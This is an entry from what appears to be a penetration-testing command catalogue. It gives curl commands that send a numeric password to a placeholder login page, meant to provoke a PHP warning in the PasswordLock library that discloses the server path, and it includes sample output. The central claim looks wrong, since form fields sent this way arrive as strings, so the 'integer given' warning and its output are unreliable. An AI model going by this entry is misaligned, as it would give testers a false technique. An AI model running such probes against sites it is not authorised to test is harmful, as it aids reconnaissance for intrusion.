---
data: 'curl -X POST ''http://target.com/login'' -d ''username=test'' -d ''password=123'' -v'
tags:
  - web
  - testing
  - information-disclosure
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:00.566Z'
id: 06f12b03-0ca3-4f63-ac6f-131b92df7f0a
verified: false
validated: true
submitted: true
---
# curl-trigger-passwordlock-error

## Command

```bash
curl -X POST 'http://target.com/login' -d 'username=test' -d 'password=123' -v
```

## Description

This command uses curl to send a POST request to a target login endpoint, providing a non-string value ('123') in the password field to trigger a PHP hash() warning in the PasswordLock library, potentially disclosing the server path. Use it during vulnerability assessment to test for input validation flaws in PHP web applications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `'http://target.com/login'` | The target endpoint URL (replace with actual) | Yes |
| `-d 'username=test'` | Form data for username field (arbitrary valid value) | Yes |
| `-d 'password=123'` | Form data for password with non-string value to trigger error | Yes |
| `-v` | Verbose mode to show full request/response details | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'http://target.com/login' -d 'password=123' -v
```

### Advanced Usage

```bash
curl -X POST 'https://target.com/api/unlock' -d 'password=123' -d 'other_field=value' -v --cookie 'session=abc'
```

## Expected Output

Verbose output including HTTP response with PHP warning in the body, such as:

* Connected to target.com (1.2.3.4) port 80
< HTTP/1.1 200 OK
...
Warning: hash() expects parameter 2 to be string, integer given in /full/server/path/PasswordLock.php on line 45

Successful execution shows the error message with path disclosure.

## Related

- [[Related Procedure|procedures/Trigger-Path-Disclosure-in-PasswordLock]]
